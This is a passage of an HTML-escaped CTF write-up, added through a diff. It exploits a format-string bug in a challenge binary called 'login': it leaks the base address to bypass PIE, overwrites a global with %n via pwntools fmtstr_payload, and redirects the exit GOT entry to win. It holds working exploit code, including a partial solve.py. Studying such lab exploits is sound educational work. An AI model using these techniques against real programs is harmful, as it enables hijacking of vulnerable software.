+	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Verifying...&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Automatically looking for our buffer offset&lt;/span&gt;
+autofmt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; FmtStr(exec_fmt) 
+&lt;span style=&#34;color:#75715e&#34;&gt;# return offset position&lt;/span&gt;
+offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; autofmt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;offset	
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;and it works properly.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_11-35.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now that our buffer starts at the sixth offset and we want it to overwrite &lt;code&gt;authen_code&lt;/code&gt; which is a global variable, so we &lt;em&gt;presumably&lt;/em&gt; can get its address using &lt;code&gt;readelf&lt;/code&gt; as follows:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;legiahuyy㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/…/Study/PWN/etc/frmstr&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ readelf -s ./login|grep authen_code
+    31: &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000004060&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; OBJECT  GLOBAL DEFAULT   &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; authen_code
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You perhaps are thinking that &lt;code&gt;0x00004060&lt;/code&gt; is the correct address for &lt;code&gt;authen_code&lt;/code&gt; then you must have forgotten about the PIE bit, but it is completely fine since we are going to glide over it one more time.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;In &lt;a href=&#34;https://en.wikipedia.org/wiki/Computing&#34;&gt;computing&lt;/a&gt;, &lt;strong&gt;position-independent code&lt;/strong&gt;[&lt;a href=&#34;https://en.wikipedia.org/wiki/Position-independent_code#cite_note-Intel_iRMX-1&#34;&gt;1]&lt;/a&gt; (&lt;strong&gt;PIC&lt;/strong&gt;[&lt;a href=&#34;https://en.wikipedia.org/wiki/Position-independent_code#cite_note-Intel_iRMX-1&#34;&gt;1]&lt;/a&gt;) or &lt;strong&gt;position-independent executable&lt;/strong&gt; (&lt;strong&gt;PIE&lt;/strong&gt;)[&lt;a href=&#34;https://en.wikipedia.org/wiki/Position-independent_code#cite_note-RedHat-2&#34;&gt;2]&lt;/a&gt; is a body of &lt;a href=&#34;https://en.wikipedia.org/wiki/Machine_code&#34;&gt;machine code&lt;/a&gt; that, being placed somewhere in the &lt;a href=&#34;https://en.wikipedia.org/wiki/Primary_memory&#34;&gt;primary memory&lt;/a&gt;, executes properly regardless of its &lt;a href=&#34;https://en.wikipedia.org/wiki/Absolute_address&#34;&gt;absolute address&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Position-independent_code&#34;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;It basically means that every time you run the file, all the addresses of functions, global objects therein will be randomized and you cannot just dump these out statically as they are inconsistent.&lt;/p&gt;
+&lt;h4 id=&#34;piepic-bypass-with-given-leaks&#34;&gt;PIE/PIC bypass with given leaks&lt;/h4&gt;
+&lt;p&gt;On that account, we need to compute the base address before being able to invoke or even modify anything. Fortunately, &lt;code&gt;login&lt;/code&gt; tells us where it is located and we can use the given address to bypass PIE and this is also our second objective.&lt;/p&gt;
+&lt;p&gt;Imagine PIE/PIC executables work like this, you have a &lt;code&gt;main&lt;/code&gt; function is located at &lt;code&gt;0x00412&lt;/code&gt;, when you run the file, &lt;code&gt;main&lt;/code&gt;&amp;rsquo;s address is then added up with a random value, say &lt;code&gt;0x1000&lt;/code&gt;, so that now it is &lt;code&gt;0x01412&lt;/code&gt;. Moreover, this random value, dubbed base address, is shared across the memory region of the current instance; hence, our &lt;em&gt;formula&lt;/em&gt; for this&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;base_address = leaked_login_addr - abs_login_addr
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and we can automate the process using pwntools.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process([elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path], stdin&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pty, stdout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pty)
+
+leaked_login_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Welcome to &amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; sector!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+abs_login_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;login&amp;#39;&lt;/span&gt;]
+elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; leaked_login_addr &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; abs_login_addr
+
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;leaked_login_addr = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(leaked_login_addr)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;abs_login_addr = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(abs_login_addr)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;success(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base_address = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;On the first and second run.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2022-01-02_14-55.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;arbitrary-write-with-format-string&#34;&gt;Arbitrary write with Format String&lt;/h4&gt;
+&lt;p&gt;We by far have had the base address, &lt;code&gt;authen_code&lt;/code&gt; address and the buffer offset, we now just need to construct our payload, accordingly modify the value of &lt;code&gt;authen_code&lt;/code&gt; and complete our first goal. This can be feasible either constructing the payload manually or using auxiliaries from pwntools.&lt;/p&gt;
+&lt;p&gt;As for myself, I would prefer the automated method to the conventional way since &lt;del&gt;I am lazy&lt;/del&gt; the latter is much more strenuous for me to handle. That being said, it is worth showing you a brief concept how we can do it by hand.&lt;/p&gt;
+&lt;p&gt;The&lt;code&gt;printf&lt;/code&gt; function has a very special format specifier &lt;code&gt;%n&lt;/code&gt; which instead of printing something, it causes &lt;code&gt;printf&lt;/code&gt; to load a pointer and write there &lt;strong&gt;the number of characters printed&lt;/strong&gt; by &lt;code&gt;printf&lt;/code&gt; before the occurrence of &lt;code&gt;%n&lt;/code&gt;. For instance, we have a C snippet as follows:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;...
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; main()
+{
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+	printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;abcdefg%n&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;data);
+	printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;data = %d&amp;#34;&lt;/span&gt;, data);
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Build and run the source:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2022-01-02_19-39.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The idea is that you will print a string of &lt;code&gt;0x1ee71ee7&lt;/code&gt; characters to &lt;code&gt;authen_code&lt;/code&gt;&amp;rsquo;s address using the &lt;code&gt;%n&lt;/code&gt; format specifier in &lt;code&gt;print&lt;/code&gt;, so your payload looks like this much or less.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;payload = authen_code_addr + b&#39;A&#39; * (0x1ee71ee7 - sizeof(authen_code_addr)) + b&amp;quot;%hhn&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have to substract the &lt;code&gt;0x1ee71ee7&lt;/code&gt; for &lt;code&gt;sizeof(authen_code_addr)&lt;/code&gt; as &lt;code&gt;%n&lt;/code&gt; would count it as well, remember? And &lt;code&gt;%hhn&lt;/code&gt; instructs &lt;code&gt;printf&lt;/code&gt; to write the number of printed bytes as byte or that of &lt;code&gt;%hn&lt;/code&gt; as short for smaller size write.&lt;/p&gt;
+&lt;p&gt;But efficiency, performance &lt;del&gt;and laziness&lt;/del&gt; are more to your liking, pwntools has a handy utility for it to match exactly what you desire - &lt;code&gt;fmtstr_payload&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Syntax&lt;/span&gt;
+fmtstr_payload(offset, writes, numbwritten&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, write_size&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;byte&amp;#39;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The function works similar to how we explain above in the manual method, however, it also provides optimization and thankfully save us some time.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process([elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path], stdin&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pty, stdout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pty)
+
+leaked_login_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Welcome to &amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; sector!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+abs_login_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;login&amp;#39;&lt;/span&gt;]
+elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; leaked_login_addr &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; abs_login_addr
+
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;leaked_login_addr = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(leaked_login_addr)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;abs_login_addr = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(abs_login_addr)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;success(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base_address = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+
+authen_code_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;authen_code&amp;#39;&lt;/span&gt;]
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;authen_code offset: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; hex(authen_code_offset))
+
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fmtstr_payload(&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, {authen_code_offset : &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1ee71ee7&lt;/span&gt;})
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fmtstr_payload: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;payload&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Enter credentials: &amp;#39;&lt;/span&gt;, payload)
+print(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;clean()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;latin-1&amp;#39;&lt;/span&gt;))
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And we have achieved our first goal - modify &lt;code&gt;authen_code&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2022-01-02_20-14.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;overwrite-got&#34;&gt;Overwrite GOT&lt;/h4&gt;
+&lt;p&gt;Global Offset Table, or GOT, is one of the sections within an ELF binary that maps symbols to their corresponding absolute memory addresses and facilitate PIE/PIC portion. Furthermore, GOT is loaded into the memory at startup to provide dynamic linking as well as functionalities for the program. Simply put, GOT contains the addresses of functions that the program will use to call from &lt;code&gt;libc&lt;/code&gt;, the C standard library and if we could overwrite an entry, it would be possible to gain code execution.&lt;/p&gt;
+&lt;p&gt;In our case, we want to overwrite GOT entry of &lt;code&gt;exit&lt;/code&gt; with the location of &lt;code&gt;win&lt;/code&gt;, however, there are some constraints:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;If the binary has &lt;strong&gt;Full RELRO&lt;/strong&gt; protection enabled &lt;strong&gt;then no GOT overwrite&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;You need to bypass PIE/PIC, ASLR before being able to call anything.&lt;/li&gt;
+&lt;li&gt;Format string or buffer overflow vulnerability.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Luckily, the binary has &lt;strong&gt;Partial RELRO&lt;/strong&gt; property and we have already handled PIE/PIC in the prior part so we can simply overwrite the &lt;code&gt;exit&lt;/code&gt; entry and replace it with &lt;code&gt;win&lt;/code&gt; using pwntools.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fmtstr_payload(&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, {authen_code_offset : &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1ee71ee7&lt;/span&gt;, elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exit&amp;#39;&lt;/span&gt;] : elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;win&amp;#39;&lt;/span&gt;]})
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fmtstr_payload: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;payload&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Enter credentials: &amp;#39;&lt;/span&gt;, payload)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2022-01-03_13-59.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;solvepy-2&#34;&gt;Solve.py&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./login&amp;#34;&lt;/span&gt;)
+pty &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;PTY
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exec_fmt&lt;/span&gt;(payload):
+	p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process([elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path], stdin&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pty, stdout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pty)
+	p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Enter credentials: &amp;#39;&lt;/span&gt;, payload)
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Verifying...&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;autofmt = FmtStr(exec_fmt)
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;offset = autofmt.offset
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process([elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path], stdin&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pty, stdout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pty)
+
+leaked_login_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Welcome to &amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; sector!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+abs_login_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;login&amp;#39;&lt;/span&gt;]
+elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; leaked_login_addr &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; abs_login_addr
+
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;leaked_login_addr = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(leaked_login_addr)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
